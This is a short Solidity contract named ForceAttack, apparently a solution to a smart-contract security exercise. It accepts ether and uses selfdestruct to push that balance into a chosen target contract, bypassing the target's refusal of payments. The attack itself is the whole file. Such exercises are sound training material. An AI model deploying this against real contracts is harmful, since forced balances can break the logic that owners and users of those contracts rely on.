// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack{
    function deposit() public payable {}
    function destroy(address payable contractAddr) public {
        selfdestruct(contractAddr);
    }
}